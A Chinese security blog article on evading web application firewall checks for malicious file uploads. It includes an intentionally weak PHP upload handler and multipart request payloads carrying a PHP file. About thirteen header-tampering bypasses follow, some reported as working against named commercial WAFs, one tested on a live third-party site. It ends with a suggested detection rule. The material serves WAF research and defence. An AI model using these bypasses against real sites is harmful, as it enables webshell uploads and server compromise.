参考：https://www.butian.net/School/content?id=256

https://www.jiwo.org/ken/detail.php?id=716



文件上传与 WAF 的攻与防

作者：JoyChou@美丽联合 发布时间：2018-04-19 18:59:53 阅读：9355

1前言


 本文的测试环境均为

- nginx/1.10.3
- PHP 5.5.34

有些特性和语言及webserver有关，有问题的地方，欢迎大家指正。

 

 

2文件上传的特征



 

**先来了解下文件上传的特征，抓包看看这段文件上传代码的HTTP请求。**

 

upload.php

 

<?php

if(isset($_POST['submit_x'])){
    $upfile = $_FILES['filename']['name'];
    $tempfile = $_FILES['filename']['tmp_name'];

    $ext = trim(get_extension($upfile)); 

    // 判断文件后缀是否为数组里的值
    if(in_array($ext,array('xxx'))){
        die('Warning! File type
error..');
    }

    $savefile = 'upload/' . $upfile;
    if(move_uploaded_file($tempfile,
$savefile)){
        die('Upload success!
FileName: '.$savefile);
    }else{
        die('Upload failed..');
    }
}

// 获取文件后缀名，并转为小写
function get_extension($file){
    return strtolower(substr($file,
strrpos($file, '.')+1));
}

?>

<html>
 <body>
  <form method="post"
action="#" enctype="multipart/form-data">
   <input type="file"
name="file_x" value=""/>
   <input type="submit"
name="submit_x" value="upload"/>
  </form>
 </body>
</html>

 

请求

POST /upload.php HTTP/1.1
 Host: localhost
 Content-Length: 274
 Cache-Control: max-age=0
 Origin: http://localhost
 Upgrade-Insecure-Requests: 1
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuKS18BporicXJfTx
 User-Agent: Mozilla/5.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
 Accept-Encoding: gzip, deflate, br
 Accept-Language: zh-CN,zh;q=0.8,de;q=0.6,en;q=0.4,fr;q=0.2
 Connection: close

 ------WebKitFormBoundaryuKS18BporicXJfTx
 Content-Disposition: form-data; name="file_x"; filename="xx.php"

 <?php phpinfo(); ?>
 ------WebKitFormBoundaryuKS18BporicXJfTx
 Content-Disposition: form-data; name="submit_x"

 upload
 ------WebKitFormBoundaryuKS18BporicXJfTx--

从中获取特征为：

- 请求Header中Content-Type存在以下特征：

- - multipart/form-data（表示该请求是一个文件上传请求）
  - 存在boundary字符串（作用为分隔符，以区分POST数据）

- POST的内容存在以下特征：

- - Content-Disposition
  - name
  - filename

- POST中的boundary的值就是Content-Type的值在最前面加了两个--，除了最后标识结束的boundary

- 最后标识结束的boundary最后默认会多出两个--（测试时，最后一行的boundary删掉也能成功上传）

 

 

 

3WAF如何拦截



 

**先来想想，如果自己写WAF来防御恶意文件上传。你应该如何防御？**

 

- 文件名

- - 解析文件名，判断是否在黑名单内。

- 文件内容

- - 解析文件内容，判断是否为webshell。

- 文件目录权限

- - 该功能需要主机WAF实现，比如我见过的云锁。

目前，市面上常见的是解析文件名，少数WAF是解析文件内容，比如长亭。下面内容，都是基于文件名解析。

大致步骤如下：

1. 获取Request Header里的Content-Type值中获取boundary值
2. 根据第一步的boundary值，解析POST数据，获取文件名
3. 判断文件名是否在拦截黑名单内

看看春哥写的这个解析文件上传的代码【https://github.com/agentzh/lua-resty-multipart-parser/blob/master/lib/resty/multipart/parser.lua】，就能理解了，不过这份代码已经没维护了。但是这份代码解析了文件名，只是绕过方式比较多233。

lua-resty-upload【https://github.com/openresty/lua-resty-upload】这份代码还在维护，不过只是取了内容，文件名需要自己解析。

------WebKitFormBoundaryj1oRYFW91eaj8Ex2
 Content-Disposition: form-data; name="file_x"; filename="xx.php"
 Content-Type: text/javascript

 <?php phpinfo(); ?>
 ------WebKitFormBoundaryj1oRYFW91eaj8Ex2
 Content-Disposition: form-data; name="submit_x"

 upload
 ------WebKitFormBoundaryj1oRYFW91eaj8Ex2--

返回

read: ["header",["Content-Disposition","form-data; name=\"file_x\"; filename=\"xx.php\"","Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php\""]]
 read: ["header",["Content-Type","text\/javascript","Content-Type: text\/javascript"]]
 read: ["body","<?php phpinfo(); ?>"]
 read: ["part_end"]
 read: ["header",["Content-Disposition","form-data; name=\"submit_x\"","Content-Disposition: form-data; name=\"submit_x\""]]
 read: ["body","upload"]
 read: ["part_end"]
 read: ["eof"]
 read: ["eof"]

 

 

## 4绕过

 


 获取文件名的地方在Content-Disposition: form-data; name="file_x"; filename="xx.php"和Content-Type里，所以绕过的地方也就在这两个地方了。

 

**4.1去掉引号**

 

Content-Disposition: form-data; name=file_x; filename="xx.php"
 Content-Disposition: form-data; name=file_x; filename=xx.php
 Content-Disposition: form-data; name="file_x"; filename=xx.php

 

 

**4.2 双引号变成单引号**

 

Content-Disposition: form-data; name='file_x'; filename='xx.php'

单引号、双引号、不要引号，都能上传。

 

**4.3 大小写**

 

对这三个固定的字符串进行大小写转换

- Content-Disposition
- name
- filename

比如name转换成Name，Content-Disposition转换成content-disposition。两年前，拿它绕过安全狗的上传，不知道现在如何。

 

**4.4 空格**

 

在: ; =添加1个或者多个空格，不过测试只有filename在=前面添加空格，上传失败。在filename=后面添加空格，截止到2017年10月04日还能绕过「某盾」WAF。

 

**4.5 去掉或修改Content-Disposition值**

 

有的WAF在解析的时候，认为Content-Disposition值一定是form-data，造成绕过。两年前，拿它绕过安全狗的上传，不知道现在如何。

Content-Disposition: name='file_x'; filename='xx.php'

 

 

**4.6 交换name和filename的顺序**

 

规定Content-Disposition必须在最前面，所以只能交换name和filename的顺序。有的WAF可能会匹配name在前面，filename在后面，所以下面姿势会导致Bypass。

Content-Disposition: form-data; filename="xx.php"; name=file_x

 

 

**4.7 多个boundary**

 

最后上传的文件是test.php而非test.txt，但是取的文件名只取了第一个就会被Bypass。

------WebKitFormBoundaryj1oRYFW91eaj8Ex2
 Content-Disposition: form-data; name="file_x"; filename="test.txt"
 Content-Type: text/javascript

 <?php phpinfo(); ?>
 ------WebKitFormBoundaryj1oRYFW91eaj8Ex2
 Content-Disposition: form-data; name="file_x"; filename="test.php"
 Content-Type: text/javascript

 <?php phpinfo(); ?>
 ------WebKitFormBoundaryj1oRYFW91eaj8Ex2
 Content-Disposition: form-data; name="submit_x"

 upload
 ------WebKitFormBoundaryj1oRYFW91eaj8Ex2--

 

 

**4.8 多个filename**

 

最终上传成功的文件名是test.php。但是由于解析文件名时，会解析到第一个。正则默认都会匹配到第一个。

Content-Disposition: form-data; name="file_x"; filename="test.txt"; filename="test.php"

 

 

**4.9 多个分号**

 

文件解析时，可能解析不到文件名，导致绕过。

Content-Disposition: form-data; name="file_x";;; filename="test.php"

 

 

**4.10 multipart/form-DATA**

 

这种绕过应该很少，大多数都会忽略大小写。php和java都支持。

Content-Type: multipart/form-DATA

 

 

**4.11 Header在boundary前添加任意字符**

 

这个只能说，PHP很皮，这都支持。试了JAVA会报错。

Content-Type: multipart/form-data; bypassboundary=----WebKitFormBoundaryj1oRYFW91eaj8Ex2

 

 

**4.12 filename换行**

 

PHP支持，Java不支持。截止到2017年10月18日，这个方法能绕过「某盾」。

Content-Disposition: form-data; name="file_x"; file
 name="test.php"

这种PHP也支持。

fi
 lename

 

 

**4.13 name和filename添加任意字符串**

 

PHP上传成功，Java上传失败。

Content-Disposition: name="file_x"; bypass waf upload; filename="test.php";

 

 

**4.14 其他**

 

其他利用系统特性的就不描述了，不是本文重点。有兴趣可以看下我的Waf Bypass之道（upload篇）【https://www.jiwo.org/ken/detail.php?id=716】。

 

 

5案例测试

 

**5.1 「某盾」**

 

测试了「某盾」WAF对恶意文件上传的拦截。方法比较粗暴，判断如下：

1. 判断POST数据是否存在Content-Disposition:字符串
2. 判断filename的文件名是否在黑名单内

两者满足就拦截，没有做其他多余的判断，正则也很好写。

测试：curl -v -d "Content-Disposition:filename=xx.php;" www.victim.com 拦截这种方式确实有误拦截情况。不过截止到2017年10月04日，某盾的上传还是能够通过在filename=后面添加空格进行绕过。POC：Content-Disposition: form-data; name="file_x"; filename= "xx.php";

下面这种也能绕过。

Content-Disposition: form-data; name="file_x"; file
 name="test.php"

 

 

**5.2 ucloud**

 

先找一个用了UCloud WAF的网站测试。

拦截

Content-Disposition: form-data; name="file_x";filename="xx.php"

去掉form-data绕过

Content-Disposition:  name="file_x";filename="xx.php"

其他的就不测试了…

 

 

6How to Play



 

 

看了这么多，那规则到底应该如何写。我个人想法如下：

1. 由于是文件上传，所以必须有Content-Type: multipart/form-data，先判断这个是否存在。
2. POST数据去掉所有换行，匹配是否有Content-Disposition:.*filename\s*=\s*(.*php)类似的规则。

这只是我的个人想法，如果有更好的想法，欢迎交流讨论。

 

 

7Reference



 

 

- WAF攻防研究之四个层次Bypass WAF

【http://weibo.com/ttarticle/p/show?id=2309404007261092631700&infeed=1】

 